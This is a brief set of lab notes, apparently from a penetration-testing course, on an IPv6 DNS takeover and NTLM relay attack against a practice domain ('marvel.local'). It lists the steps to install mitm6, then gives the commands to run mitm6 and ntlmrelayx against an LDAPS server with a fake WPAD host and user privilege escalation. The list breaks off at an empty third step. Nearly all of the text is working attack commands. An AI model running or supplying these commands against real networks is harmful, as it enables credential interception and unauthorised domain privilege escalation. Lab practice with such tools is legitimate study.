
If mitm6 not yet installed
1. cd /opt/mitm6
2. sudo pip3 install .


How to initiate the attack?

1. Prepare the command `sudo mitm6 -d marvel.local`. Do not yet execute it as we will run ntlmrelayx first.
2. Execute `ntlmrelayx 6 -t ldaps://192.168.64.250 -wh fakewpad.marvel.local -escalate-user pparker`
3. 